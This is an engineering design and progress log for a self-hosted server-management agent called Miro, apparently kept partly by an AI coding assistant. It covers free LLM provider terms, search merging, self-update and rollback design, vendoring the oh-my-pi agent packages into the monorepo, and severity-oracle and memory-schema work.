  - **OpenRouter `:free`** - free account, no card; 20 RPM; 50 RPD under $10 lifetime credit, 1,000 RPD at $10+; failed requests count; **training is PER-MODEL** (ToS §6.1 - some free/promo models explicitly trade training rights for access). → `public` unless a specific model is verified no-train; a router that trusts the `:free` suffix alone is a data-leak bug.
  - **Google AI Studio / Gemini free** - key; limits are dashboard-only and per-project (never hardcode); grounding capped at 500 RPD; **trains on free-tier content, human review of de-identified I/O, "do not submit sensitive… information"** (paid tier excluded). → `public` only.
  - **Cloudflare Workers AI** - key; 10,000 Neurons/day (resets 00:00 UTC); no training without consent; the best models are paid-only. → `internal`-eligible on terms, but the daily cap can exhaust mid-task.
  - **Mistral free ("Experiment")** - key, no card; ~1 rps / 1B tok/mo (secondary-sourced - RE-VERIFY); **trains by default**, opt-out is manual. → `public` only.
  - **SambaNova** - key; 200K tok/day but **20 req/day**; data use undocumented. → `public` only; impractical beyond smoke tests.
  - **Cohere trial** - key; 1,000 calls/mo; the no-train commitment applies ONLY to paying customers; **trial keys are contractually non-commercial**. → `public` only, and ToS-restricted.
  - **NVIDIA NIM** - key; ~40 RPM (traffic-dependent, no SLA); data policy **unresolved/contradictory** even in the primary ToS. → `public` only; never "safe" by default.
  - **llm7.io** - **no key** (anonymous, `api_key="unused"`), 30 RPM anonymous → 120 RPM with a free token; training not stated; **operated by an individual (GitHub `chigwell`), no status page**. → last-resort `public` fallback, NOT a primary.
  **Revision to §5.14's "$0 out of the box":** llm7 is the keyless LAST resort, not the default. The realistic zero-cost primaries are **Groq** (no-train, `internal`-safe) and OpenRouter `:free` (per-model checked), with Gemini/Mistral free as `public`-only and llm7 behind all of them.
- **Search:** never make public SearXNG instances load-bearing - JSON is off by default project-wide, unsupported-format behavior is inconsistent (403 / silent HTML / 307), and public instances get blocked by upstream engines under exactly the load an agent adds; `searx.space` has no reliable per-instance JSON flag - probe `&format=json` empirically. Self-host: `formats: [html, json]`, keep the Valkey limiter, never expose publicly without your own auth/rate-limit. Prefer **provider-native hosted search where the turn already runs on that provider** (free via the vendored pi-ai): Anthropic's is the most operationally useful (`allowed_domains`/`blocked_domains`, `max_uses` surfaced in-band as `max_uses_exceeded`, mandatory citations whose `encrypted_content` must round-trip verbatim on multi-turn); OpenAI = flat $10/1k calls; Gemini grounding pricing differs by model generation (3.x per-query vs 2.5 per-prompt). **Ollama `web_search`'s quota/pricing is UNDOCUMENTED on the official page** - verify empirically (watch for the first 429); never hardcode an assumed limit. **Merge = Reciprocal Rank Fusion** (`Σ 1/(k + rank_i)`, `k=60`) over URL-normalized buckets with a per-source fan-out cap - replaces the draft `normalize.ts`'s naive `1/(i+1)` sum.
- Pitfalls to design against: rate-limit 429 vs spend-cap 429 need different handling; `:free` is per-model; multi-instance quota drift (irrelevant until two daemons); Gemini limits are not static; two numbers (Mistral tier limits, NVIDIA pricing) came only from secondary sources - re-verify before they enter quota config.
- Sources: LiteLLM routing / reliability / load-balancing / redis docs; OpenRouter routing, limits, privacy, terms; OpenAI + Anthropic rate-limit docs; continue.dev model roles; aider model settings; `Mirrowel/LLM-API-Key-Proxy`; llm7 quickstart + `chigwell/llm7.io`; Groq rate-limits + your-data; Gemini terms / rate-limits / pricing; Cloudflare Workers AI pricing + responsible-ai; SambaNova rate-limits; Cohere rate-limits + enterprise data commitments; Cloudflare AI Gateway DLP; Bedrock guardrails sensitive filters; Portkey + LiteLLM PII masking; Lakera DLP; SearXNG settings / search-api / limiter / docker docs; searx.space; Ollama web-search docs; OpenAI pricing; Anthropic web-search tool docs; Gemini pricing.

**Integrated plan - DECIDED 2026-09-03 (grilled; the user chose "one giant foundation slice: vendor + assurance together").** The "Slice 0" and "Slice 1" blocks below are ONE slice - the Foundation - delivered before any capability work (branch `capability-architecture` → one PR, with commits per unit and the full live-verify bar); the later blocks renumber accordingly (capability layer = slice 1, `web.fetch`/SearXNG/hashline/ledger = slice 2, extension impls/admission/pi-iso/browser = slice 3). Every slice = branch + PR + extensive unit tests + a dev-VM live-verify. The ordering principle: slice 0 replaces the agent library, so anything touching the agent loop is built on the vendored one, not ported twice; the loop's assurance mechanisms (track A) are Miro's differentiator and mostly touch the existing engine/memory, so they come before more capability is stacked on top.

- **Slice 0 - Foundation: vendor omp + single binary.** Vendor `pi-ai` / `pi-catalog` / `pi-agent-core` (+ `omptype`/`utils`/`wire`/`natives`/`snapcompact`), trim the junk providers, add the free providers (Groq, OpenRouter `:free` per-model-checked, Gemini free, Cloudflare, Mistral; llm7 last-resort only), migrate imports (`builtinModels` → catalog; `Type` from TypeBox - verified), unify Iroh + the pi-natives functions into ONE N-API crate via `build.rs`, per-target native CI (omp's recipe), a `--smoke-test` self-check that asserts BOTH addons initialize (the `bun#26045` check), daemon green + live on the VM. Fold in the small assurance items that touch files slice 0 already touches: **global write mutex**, **rate limits + cooldowns + no empty/glob selectors**, the **deterministic termination gate** (agent loop), **repair-contract fields on `OperationPlan`** (`expects`, `rollbackWhen`, `scopeEvidence`, `dryRunFidelity`). Cross-cutting packaging lands here too: the hardened systemd unit (`MemoryDenyWriteExecute` live-verified), static-credential auth as the standard, atomic self-update, apt `Signed-By`/SHA-256.
- **Slice 1 - Engine assurance: the loop's trust mechanism.** Severity oracle μ + the TNR commit rule (kind `verify()` AND μ_post ≤ μ_pre); the agent-level **undo-then-retry loop** (start from s_pre, plans hashed, identical retry refused, cap 3, escalate with trajectory); **reboot lifeline** via boot assessment (pending-bless marker, native BLS/snapper where present); **FS snapshots** (btrfs/ZFS/LVM) + data inside `captureState`, data-migrating ops `irreversible` without one; dry-run fidelity surfaced in the UI; **model-tier gating** on the maturity ladder and the termination gate; **memory schema** (`helpful_count`/`harmful_count` wired to `verify()` outcomes, per-category `expires_at`, `observed_at`/`source`/`app_version`/`superseded_by`; summary phrases facts as dated observations); **structured validator failures** + the **repair-budget reshape** (3 independent regenerations, ≤1 repair each) + **hide the judge** + the two admission checks (discriminating reads; diagnostics that fail when the app is down); **Prodtest per repair** (committed repairs leave their re-runnable `verify` for Dreaming). Live-verify: a STRATUS-style undo-then-retry against a real induced Jellyfin fault on the VM, and a verify that refuses the model's own success claim.
- **Slice 2 - Capability layer + search + quota + egress.** Registry + router (role → profile fallback chains, credential pools, cooldown-not-ban, fallback ACL) + `web.search` (own resolver: Ollama HTTP with an empirically-discovered quota, SearXNG public pool + self-hosted, provider-native via pi-ai; RRF `k=60` merge with per-source caps) + the quota layer on top of pi-ai's auth (known / estimated / exhausted; spend-cap 429 handled as `untilUnknown`) + **3-tier egress** (regex sensitivity classifier failing closed, tier → provider allowlist in config, the `{{secret:ref}}` mechanism extended to infra identifiers, two-way filtering, an egress audit table). **Kills Brave.** Live-verify against real public nodes + Groq, with a `secret`-tier turn provably never leaving the box.
- **Slice 3 - `web.fetch` + self-hosted SearXNG as a confirmed docker-op (ask-first, JSON on, limiter kept) + `hashline` edits through the engine + the managed-facts ledger with drift-as-plan + etckeeper for `/etc`.**
- **Slice 4 - Extension-defined capability impls (SDK `capabilityImplementation`) + staged admission with canary-by-shape and automatic rollback to the last passing version + library hygiene (prune/dedupe/search-defer past ~50 tools) + ReasoningBank-form Dreaming reflections + `pi-iso` isolation + browser/computer control.**
- Then: trace-capture → `app_recipe` as abstracted recipes with the trace beside them as evidence, and Stage D (the media stack end-to-end) as the golden proof of the whole loop.

### 5.16 Self-update, migration, recovery, diagnostics (2026-09-03, grilling in progress)

Already-decided starting points (user-provided, from a plan drafted with another AI, given as constraints): Miro updates itself, configurably; default = check automatically, ask before installing; automatic-stable is an available option; keep last 3 versions locally for rollback; large jumps try direct migration first, else automatically bridge through intermediate releases (never manual); releases from GitHub Releases initially, stable + beta channels; bug reporting via CLI/UI/agent; nothing diagnostic/telemetry leaves the server automatically, but the agent assembles sanitized diagnostic bundles locally so a report is ready if the user submits one; other deps stay aggressively current, tested not blindly bumped. TypeScript stays 5.9.3 (the JS compiler API `validate.ts` depends on) until 7.1 ships a stable programmatic API - already decided in §5.15 D.

Repo state found (2026-09-03): fully greenfield here - every `package.json` is `"0.0.0"`, no git tags, no GitHub Releases, no CI/release workflow. No dedicated diagnostic/telemetry/crash-report subsystem exists, but real substrate does: the read-only inventory tools, the `capabilities` tool, an `incident` memory category (`recordIncident`, currently scoped to operation outcomes only), and a genuinely solid `redactSecretsInText` (passwords/tokens/API keys/AWS/GitHub/Slack tokens/JWTs/PEM blocks/shadow-hash lines + a `{{secret:ref}}` placeholder guard). `StatusEvent` carries no version field yet. Incidentally found and fixed: `classify.ts` had the same NUL-byte-makes-git-call-it-binary bug as `index.ts` earlier this session (commit `6e71125`) - both now clean text.

**Decided (round 1, grilled):**
- **Updater shape: mirod-internal, systemd-assisted swap.** mirod downloads/verifies/stages a new binary + a marker; systemd's `ExecStartPre=` does ONLY the atomic rename-if-staged before starting mirod; all judgment (verify/decide/health-check/revert) stays in mirod with full DB/severity-oracle access. No separate launcher binary, no dpkg-driven install - firms up the sketch already in §5.15 D.
- **Auto-heal is a hard requirement, reusing the ALREADY-DECIDED reboot pending-bless mechanism (§5.15 A), generalized to self-updates - not a second bespoke thing.** A self-update is the same event class as a reboot: a restart with a real chance the new state doesn't come back healthy. mirod writes a pending-bless marker before restarting into the new binary; on boot it proves health within a bounded window using the SAME severity oracle μ the operation engine's TNR commit rule already uses (socket/Iroh listener up, DB opens cleanly, extensions load, chat responds); μ_post not worse than μ_pre (recorded just before the update) blesses it, otherwise mirod auto-reverts to `mirod.prev` with zero human involvement. This single mechanism answers three of the originally-open questions: what counts as a successful post-update health check, how interrupted updates recover deterministically (crash before blessing = still-pending marker = revert on next boot, same shape as `reconcileOperations`), and "never let Miro stay broken."
- **Downgrade: forward-compatible-tolerant discipline, no dedicated snapshot/hybrid infrastructure.** User found the snapshot-coupling design too complex; simplified to the plainest of the three options offered. The `ensure*Table` convention (already additive/defensive) becomes a hard discipline: older code must never crash or delete data on state it doesn't recognize, only ignore it. Downgrading is then just "run an older binary against the current DB," no special machinery, no coupled data loss, no extra disk. "Keep the last 3 versions locally" means exactly 3 old BINARIES kept for reinstall/pin, with no DB snapshot coupling. Consequence flagged to the user: a downgrade doesn't undo a bug the older code still had, it just runs old code against current data - a behavior tradeoff, not a bug-tracking one.
- **Artifact signing: Sigstore/cosign, keyless.** User explicitly deprioritized minimal-dependencies for "something that works, has worked for years, and is verified secure," and asked directly for a call between minisign and Sigstore. Recommended and decided: Sigstore - no long-lived private key to protect at all (OIDC-bound ephemeral certs from GitHub Actions' own identity, not a static secret that can leak from a compromised runner), broader current adoption at scale (npm provenance, PyPI trusted publishing, Kubernetes, GitHub's own attestations) than minisign, and native low-friction integration with the already-chosen GitHub Actions pipeline. Implementation: the `sigstore` JS/TS client library, not the Go `cosign` binary (stays Bun-native, no external tool dependency); verify against a bundled transparency-log inclusion proof so install-time verification needs no live network call to Rekor.
- **Autonomous rollback of a subtle (non-crash) regression: explicitly parked, not decided.** User said "forget this" rather than choose among the four framings offered. Default until revisited: never autonomous for this case, only ever a proposed suggestion with evidence - consistent with the existing "destructive/lifeline never auto-approve" principle. Distinct from the auto-heal above, which IS decided and IS autonomous, but only for the mechanical "did it come back up" signal.

**Decided (round 2, grilled):**
- **State versioning: monotonic state-version counter + an ordered list of one-time migration functions, independent of release semver** (closes the "do X once" gap `ensure*Table` has no hook for today; doubles as the bridge-release signal, since a release can always walk every migration step in between - bridging is then purely a binary/protocol concern, never a data one). **Exemption: breaking DB changes are freely allowed with NO migration discipline until the first real release (0.0.1) ships.** Before 0.0.1 there is no installed base to preserve compatibility for - the whole migration mechanism is prospective infrastructure for after the first release, not something retrofitted onto today's schema. From 0.0.1 onward, every schema-affecting change bumps the state-version and registers a migration step.
- **Diagnostic bundle: always-on rolling buffer, capped and garbage-collected**, continuously maintained (not assembled fresh on demand) - captures the actual failing moment rather than whatever state survives until someone gets around to reporting it. Contents draw from the substrate found in round 1 (timeline events, incident memory, an inventory snapshot, recent operation outcomes, version/uptime, recent logs), all through `redactSecretsInText`.
- **Update timing (for the "automatic stable, no asking" mode): quiescence-gated** - install only when no operation/chat turn/learning session is in flight, never a forced restart mid-work. A maintenance-window preference can layer on top later if wanted.
- **Staged rollouts: dropped entirely, out of scope.** True staged/percentage rollout is a fleet-scale concept and doesn't fit Miro's single-server architecture or the scope freeze (no fleet tooling, no large cloud backend). A bad release is instead caught per-install by the auto-heal/health-check mechanism above - that's the actual safety net here.

**New branch opened mid-round: the update-notification screen (web/TUI), and what it revealed about remote connectivity.** User asked for a concrete UI (version-from/to, a short summary, three choices: update-now-and-watch [also propagating to any remote-connected TUI], skip this version, skip) and separately asked how remote/Iroh actually works. Verified against real code (`iroh.ts`, `apps/miro/src`), not recalled: mirod runs the unix socket and an Iroh P2P endpoint simultaneously; a `/pair`-issued ticket lets a REMOTE session of the exact same `apps/miro` TUI dial in over Iroh (direct P2P, or relayed through a public Iroh relay node under NAT) - there is no separate remote-TUI codebase, just a different transport carrying the identical `ClientMessage`/`ServerEvent` protocol into the same `createConnectionState()`. Two real, confirmed-by-grep gaps this notification design needs and doesn't have yet: (1) **no connected-clients registry** - each connection is handled in isolation today, so broadcasting "update available" to every open session (local + any remote ones) needs new plumbing (connections register/deregister a `send` callback, the daemon iterates it); (2) **no reconnect-on-drop logic in the TUI** - confirmed absent by grep. This matters structurally, not just cosmetically: **any restart (which self-update requires) drops every connection instantly on every transport - there is no way to watch it happen through that moment on any client, local or remote.** The honest design streams progress up to the restart, then the client must auto-reconnect and show the post-restart bless/revert outcome - new work on both ends, not existing behavior. Also relevant: the Iroh relay path specifically has known, unresolved flakiness from earlier live testing (direct connections are solid); a remote user watching this is on the less-proven path.

**Decided (notification screen specifics, grilled):**
- **Two dismiss options collapsed into one.** Dropped "skip this version" (the per-version mute) entirely. The remaining option is renamed **"ignore"** and is SESSION-scoped only: dismisses the prompt for the current connection/session, no persisted skip-list, no disable-checking toggle. It will prompt again next connection/check cycle if still not updated. Simpler data model - no new DB state needed for this at all.
- **Update summary: a separate short one-liner field, plus full release notes viewable on request.** The signed release manifest carries both a `summary` (shown directly in the prompt) and full notes (or a link to them) fetchable on demand - not just the raw GitHub Release body reused as-is.
- Screen is therefore: version-from → version-to, the one-line summary, two choices - (1) update now and watch it happen (streamed to every open session via the new broadcast registry, with the explicit caveat above that the stream necessarily breaks at the restart and resumes via reconnect), (2) ignore (session-scoped).

### 5.17 Foundation slice - the omp vendor, complete (2026-09-04)

All 8 packages from the §5.14/§5.15 D checklist are now vendored into the monorepo under Miro-native names (the user, mid-vendor: "i want to mostly decouple from pi in the codebase names and stuff - this is Miro. Not Pi-Server-Edition" - every package already vendored at that point was renamed too, not just the ones done after):

| omp name | Miro package | role |
|---|---|---|
| omptype | `@miro/schema-engine` | ArkType-compatible schema/validation engine |
| pi-wire | `@miro/agent-wire` | shared wire types for the model/agent layer (distinct from `@miro/protocol`, Miro's own client<->daemon wire protocol) |
| pi-natives | `@miro/native` | Rust N-API bindings - **TS interface only, the actual crate is not built yet** (see below) |
| pi-utils | `@miro/agent-sys` | process/fs/OS-level utilities (distinct from the existing `apps/mirod/src/agent/model-utils.ts`) |
| pi-catalog | `@miro/model-catalog` | LLM provider/model catalog + compat rules + discovery |
| pi-ai | `@miro/model-client` | the LLM streaming/provider client (hosted tools, credential rotation, 302 files) |
| snapcompact | `@miro/context-compact` | bitmap-frame context compression |
| pi-agent-core | `@miro/agent-core` | the Agent/AgentTool loop (43 files) |

All copied from oh-my-pi v18.1.8 (commit `596f2da710`), MIT license preserved per-package (root Miro repo stays AGPL-3.0-only), test files dropped (would exercise the not-yet-built native addon), `research/`-style non-shipped tooling excluded. Only one real external dependency across all 8: `@opentelemetry/api` (agent-core). Full monorepo (all 8 + `apps/mirod`, `apps/miro`, `packages/protocol`/`sdk`/`ui-model`) typechecks clean; Miro's own `bun test` suite unaffected (265 pass / 0 fail) since nothing in Miro's own code imports the vendored packages yet.

**Root tsconfig.json changes made along the way, each fixing a whole class of vendoring friction rather than being patched per-site:**
- `"allowArbitraryExtensions": true` - lets a `.json` import resolve against a companion `.d.json.ts` type file (model-catalog's compiled `rules.json`); this alone resolved ~35 "implicitly has an any type" errors that turned out to be downstream of the JSON type never resolving, not real inference gaps.
- `"lib": ["ESNext", "DOM", "DOM.Iterable"]` (was missing `DOM.Iterable`) - plain `"DOM"` doesn't include the iterable protocol for WebIDL types like `Headers`; fixed every `for...of new Headers(...)` / `.entries()` site across model-client in one change.
- Per-package `text-assets.d.ts` ambient `declare module "*.md"` (mirrors omp's own `types/assets/index.d.ts`) for Bun's `with { type: "text" }` prompt-template imports - needed once per package whose OWN source does this (model-client, context-compact, agent-core), and additionally cross-included via `include` in any package (agent-core) that imports source from a sibling package with its own `.md` imports, since a package's `tsc` run doesn't automatically see another workspace package's local ambient declarations just because bundler-mode resolution reaches into its source.

**Genuine cross-compiler friction found and fixed (omp's own toolchain is `tsgo`, the Go-native TypeScript compiler, for `check:types` - Miro deliberately stays on `tsc` 5.9.3 until 7.1 ships a stable API, per the earlier decision). None were real bugs in the vendored logic - all confirmed behavior-preserving:**
- ~10 sites where a `Uint8Array` is passed as a `fetch`/`Response` body (`ptree.ts`, `discovery/devin.ts`, `bedrock-mantle.ts`, `cowork-fetch.ts`'s cross-realm `node:stream/web` `ReadableStream`, `providers/devin.ts` x2, `usage/devin.ts`, `openai-codex-responses.ts` x2) - `Uint8Array<ArrayBufferLike>` vs `BodyInit`'s `ArrayBuffer`-only-backed `ArrayBufferView`, a TS lib-strictness gap; `fetch`/`Response` accept a `Uint8Array` unconditionally at runtime. Fixed with narrow `as BodyInit` casts, each noted inline.
- A genuine **bun-types bug**, not an omp issue: this bun-types version declares `Bun.WebSocket`'s `onmessage` callback parameter as `typeof MessageEvent` (the class itself) instead of an instance type. Confirmed by reading the exact mismatch tsc reported after an explicit parameter annotation collided with the (buggy) declared type. Fixed by casting locally inside the handler body instead of annotating the parameter.
- Two package.json fields dropped during my own initial simplification, restored: `pi-utils/dirs.ts` reads `engines.bun` for `MIN_BUN_VERSION` (a real regression I introduced by simplifying package.json too far, not an upstream issue).

**Deliberately kept, not trimmed, matching the already-decided "no provider trim in slice 0" precedent:** model-catalog's `discovery/` subdirectory (Cursor/Codex/Gemini-CLI/GitLab-Duo-Workflow/Antigravity/Devin local-credential-based model discovery) - mostly irrelevant to a server daemon, but confirmed a load-bearing dependency of `provider-models/google.ts` and `special.ts`, which Miro does need; surgical removal would be real, risky mid-vendor surgery for no concrete benefit yet since unused code here is harmless.

**Explicitly deferred, tracked separately, not blocking anything:** the actual Rust compilation of `crates/pi-natives` (38 modules, 487 `#[napi]` exports, ~40 external crate dependencies) - only its TS-facing interface (committed `.d.ts`/`.js` loader files) is vendored. Confirmed by direct test: the loader is EAGER (a bare `import` throws immediately without the compiled `.node` - "Cannot find module 'pi_natives.darwin-arm64.node'"), not lazy. This does not block `tsc` (never executes code) or anything currently in Miro's test suite (nothing imports these packages yet), but means nothing that transitively imports `@miro/native` can be *run* until the crate is actually built - the unified-addon work (folding Iroh into the same crate) from §5.15 D is still ahead. Real Rust toolchain confirmed present on the dev Mac (cargo 1.97.1, arm64) for when that starts.

**User's standing principle, stated mid-vendor and applied throughout:** "we can also basically hardfork anything that gives us a problem and maintain it ourselves" - license to modify vendored source directly (not just work around it) wherever it clearly helps, which is what every fix above already does (inline casts and annotations directly in the vendored files, not wrapper shims).

**Not yet done at the time of writing - DONE in §5.19 (2026-09-04, later the same day), kept here as the record of what was known before executing it:** none of Miro's own code (`apps/mirod`, `packages/sdk`) has been switched over yet. `apps/mirod/package.json` and `packages/sdk/package.json` still depend on the OLD `@earendil-works/pi-ai`/`pi-agent-core` (`^0.84.4`). 23 files import it (`apps/mirod/src/agent/*` incl. `context.ts`/`index.ts`/`model-utils.ts`/`ollama.ts`/`worker.ts`/`tools.ts`/`read-tools.ts`/`operation-tools.ts`/`interaction-tools.ts`/`memory-tools.ts`/`learn-tools.ts`/`codex-auth.ts` + their `.test.ts` files, `apps/mirod/src/extensions/learn.ts`/`learn-agent.ts`/`repair.ts`, `apps/mirod/src/memory/dreaming.ts`, `apps/mirod/src/index.ts`, `packages/sdk/src/index.ts`), 4 distinct import specifiers (`@earendil-works/pi-ai`, `pi-ai/providers/all`, `pi-ai/api/openai-completions.lazy`, `pi-agent-core`).

**Confirmed by reading the real vendored source (not assumed) - this is genuine behavioral porting, not a mechanical rename, and stops here for the night rather than being guessed at unsupervised against the live, tested agent loop:**
- **`Agent`'s `systemPrompt` is now `string[]`, not `string`** (`packages/agent-core/src/types.ts:668,884`, both `AgentState`-shaped interfaces) - confirmed as a real type, not just a README illustration. Miro's `agent/index.ts:176` currently passes `systemPrompt: systemPrompt(...)` where that function returns a plain string (`agent/index.ts:68`). Every call site needs to become an array - but first check WHY the new API wants an array (a naive `[oldString]` wrap may be correct, or the array elements may carry independent semantic meaning - e.g. separate cache-boundary segments - worth understanding before blindly wrapping).
- **The turn-execution pattern has moved from a bare async call to event-subscription + `.prompt()`**: the README's Quick Start shows `agent.subscribe((event) => {...})` then `await agent.prompt("Hello!")`, with events shaped like `{type: "message_update", assistantMessageEvent: {type: "text_delta", delta}}` - visibly different from whatever `runTurn`'s current implementation (`agent/model-utils.ts`) drives against the 0.84.4 API. `TurnHooks` (`onActivity`/`onDelta`/`parentActivityId`) is Miro's OWN abstraction built on top of the old API's shape and needs to be re-verified end to end against the new event stream, not just have its imports swapped.
- **`builtinModels` is confirmed gone** - replaced by `pi-catalog`'s (now `@miro/model-catalog`'s) `createModelManager()` (`model-manager.ts:95`) / `getBundledModels(provider)` (`models.ts:47`), a real API shape change `pickDefaultModel`/`agent/index.ts`'s model-registry construction depends on.
- `streamSimple` (`packages/model-client/src/stream.ts:1454`), `Agent`/`AgentTool` (`packages/agent-core/src/agent.ts:355`, `types.ts:783`), and `Type`/`type` (re-exported from `@miro/model-client`'s own top level, itself re-exporting `@miro/schema-engine`) all exist under matching or near-matching names - these three are still expected to be low-risk per the earlier verification, unlike the three items above.

This migration is the step that makes the vendor actually load-bearing rather than just present in the tree - but it touches the live daemon's core, tested agent loop, so it's queued as reviewed work rather than pushed through unsupervised. The 8-package vendor above is fully safe to build on regardless: nothing in it depends on this migration happening first.

### 5.18 Engine-assurance units built after the vendor, and where autonomous work stopped (2026-09-04)

Continuing the Foundation slice's engine-assurance checklist (§5.15 A/B) on Miro's own existing code, independent of the deferred `apps/mirod` migration above. Four units landed, each additive (no existing behavior/output shape changed) and either unit-tested or live-verified:

- **Severity oracle** (`operations/severity.ts`, commit `38ecbb1`): STRATUS's TNR commit rule. `runOperation` now computes a cheap severity score (failed systemd units, crash-looping containers, disk ≥90%, recent incidents) before and after every operation; commit requires the kind's own `verify()` AND the score not having gotten worse. Catches a narrowly-correct verify() that missed a wider regression. Injectable via `OperationToolContext.computeSeverity` so existing tests stay deterministic. 10 tests.
- **Memory provenance/outcome columns** (`memory/store.ts`, commit `1464ca9`): `helpful_count`/`harmful_count` (outcome feedback, separate from `occurrence_count` which only ever means "seen again"), `expires_at` (query/listAll/topFacts now exclude an expired row by default), `observed_at`/`app_version` (verifier-drift substrate), `superseded_by` (column only). Added via the same defensive `PRAGMA table_info` + conditional `ALTER TABLE` guard `extensions/store.ts` already established - no migration framework exists yet (§5.16 decided a real one, not built). Every existing `remember()` call site is unaffected; the deeper wiring (which operation used which memory row, when a fact is genuinely superseded vs. reinforced) is real design work, deliberately left for when that linkage is actually built, not guessed at here. 8 tests.
- **Filesystem-snapshot detection** (`operations/fs-snapshot.ts`, commit `4fd76ac`): the upgrade path over `snapshot.ts`'s tar-with-a-64MB-cap, scoped to DETECTION ONLY - the actual btrfs/zfs snapshot create+restore commands are safety-critical rollback machinery this dev machine has no btrfs/zfs to live-verify against, so they're not written yet rather than shipped untested (LVM excluded on purpose too - it snapshots at the block-device level, not per-path). Real finding while building it: `inventory/storage.ts`'s `getMounts()` cannot be reused for this - its `filesystem` field is `df`'s DEVICE-path column, not the fs type name, and would have silently misdetected every real disk. Used `findmnt -no FSTYPE` instead. **Live-verified against the dev VM's real Debian**, not just unit-tested: `detectFilesystem('/')` correctly returned `"ext4"` (independently confirmed via a raw `findmnt` call first), graceful degradation confirmed both ways (no `findmnt` on this dev Mac, a nonexistent path on the VM). 5 tests.
- Blast-radius guards and repair-contract fields (commits `784fa89`, `7a2d7fc`, both earlier this session, already recorded) round out what's landed from the Foundation slice's assurance checklist.

**Deliberately not attempted tonight - the honest edge of what's safe to execute without review, same category as the `apps/mirod` migration and the native-crate scope decision above:**
- **Structured validator failures** (`extensions/validate.ts`): turning `ValidationResult.failures: string[]` into `{entry, field, rule, fix, example}` objects is a genuine shape change across every failure-producing call site AND its consumers (`learn-agent.ts`'s `extension_write`, `extensions/repair.ts`) in the self-extension pipeline that was live-proven this session (Jellyfin promoted in 1 attempt). Different risk category from the four units above, which were all purely additive - this changes an existing, working output shape. Queued, not guessed at.
- **Agent-level undo-then-retry, model-tier gating, the deterministic termination gate**: all genuinely blocked on the deferred `apps/mirod`/agent-core migration above - they live in the agent loop, not the operation engine.
- **Reboot lifeline via boot assessment**: needs a real design decision about the pending-bless marker format and systemd integration, not just mechanical execution.
- **Managed-facts ledger + drift-as-plan**: on inspection, "record facts on every commit" needs operation kinds to declare what they manage in a more structured way than today's `writes: string[]` paths - genuinely more design work than a schema addition, not scoped down further tonight.
- **Prodtest per repair**: extension/Dreaming-adjacent, not reached.

**Session state at this point:** 35 commits on `capability-architecture` (local only, not pushed - the user's own PR-per-slice workflow, see `feedback_git_pr_workflow` memory, still applies once this is ready for review). All 13 packages/apps typecheck clean; full suite 287 pass / 0 fail. Nothing destructive or irreversible happened - everything is a normal commit, fully reviewable via `git log`/`git diff`. The three deferred/queued items above (agent migration, native-crate scope, structured validator failures) are the concrete next decisions, each documented precisely enough to execute quickly once reviewed rather than needing rediscovery.

**Agent-facing tool surface, proposed (not contested, stated for the record):** read tools (immediate, no confirm) - `version_info`, `list_versions`, `update_status` (severity oracle μ, pending-bless state if mid-update), `collect_diagnostics` (returns/packages the rolling buffer). Mutating tools (through the operation engine, confirmed like every other write, including when the agent itself initiates one) - `install_update`, `rollback_to_previous` (a human-initiated single-step downgrade - distinct from the parked autonomous-judgment question; an ordinary confirmed operation), `set_update_channel`, `pin_version`/`unpin_version`.

**Decided (round 3, grilled):**
- **Version pinning: persisted, never fully silent.** A real settings entry (`pinned_version`); Miro never auto-installs past it, but still surfaces a quiet/passive notice when a newer version exists - avoids silently missing a security fix. Unpinning is explicit; no auto-expiry.
- **Bug fingerprinting: build the full thing now, not just the fingerprint half.** (a) Generalize incident recording to catch UNCAUGHT daemon exceptions too - today `recordIncident` only fires from operation outcomes; add `process.on("uncaughtException"/"unhandledRejection")` handlers that write a fingerprinted incident the same way. (b) Fingerprint scheme: hash of {exception constructor name, the top ~3-5 stack frames' file+function name - deliberately EXCLUDING line numbers, since those shift trivially across builds for the exact same logical bug and would break stability}. Use this fingerprint as the incident's key (`incident.crash.<fingerprint>`) so repeat occurrences reinforce via the existing occurrence-count mechanism rather than creating duplicates. (c) The signed release manifest gains a `fixes: [fingerprint, ...]` field the maintainer populates per release. (d) When an incident's fingerprint appears in a release's `fixes` list that's newer than the installed version, that's a strong signal surfaced two ways: fed into the update-notification's summary ("this release fixes an issue you hit on <date>") and checked before a diagnostic bundle is assembled for submission (a bundle can note "this may already be fixed in vX.Y" rather than filing a stale report).
- **Update-check/download/verify/stage logic runs in an isolated subprocess, not the main daemon process.** Different failure mode than "the new binary won't boot": a bug in the CURRENTLY-RUNNING code that checks for/downloads/verifies an update could otherwise crash or hang the still-working daemon. The extension host (`extensions/host.ts`) already proves this exact pattern in this codebase - a subprocess boundary so a bug in generated/risky code can't take the main process down. Reused here, not invented fresh.
- **Quiescence-gating applies to the MANUAL "update now" click too, not just automatic mode.** An in-flight OPERATION is safe to interrupt (durable, reconciles on the restart exactly like a crash). An in-flight CHAT TURN or learning session is NOT durable today (`ConnState` is in-memory, per-connection) and would simply be dropped - so "update now" warns/blocks on active non-operation work by default, consistent with the same "never silently lose someone's in-flight work" principle already decided for automatic updates.
- **Garbage collection of old binaries:** GC the oldest kept binary once a newly-installed version has been blessed (passed its post-update health check) - settles back to exactly 3 kept versions shortly after each successful update, briefly 4 during the bless window itself.
- Confirmed already resolved by the state-versioning decision, no separate mechanism needed: config migrations (settings live in the DB `settings` table, covered by the same additive/migration-step discipline as any other table - there is no separate on-disk config file format to version); "bridge releases" reduce to a binary/protocol-format concern only (an old binary's own update-check code understanding a very new release manifest), never a data concern, since any release can walk every migration step in between.

### 5.19 The agent loop runs on the vendored packages - migration done and live-verified (2026-09-04)

Branch `migrate-agent-loop` (stacked on `capability-architecture`, PR #3). `apps/mirod` and `packages/sdk` no longer import `@earendil-works/pi-ai` / `pi-agent-core`; the vendor from §5.17 is now load-bearing. Commits `e178e6b` (the migration), `3aba96e` (a live-found schema bug, below), plus this record.

**The API drift, as actually executed (§5.17's three "genuine porting" items, resolved by reading the vendored source, not guessing):**
- `systemPrompt: string[]` - a plain `[oneString]` wrap IS correct: `Agent.setSystemPrompt` accepts either and does exactly that wrap; the array exists for prompt-cache segment boundaries omp's own host uses, which Miro does not.
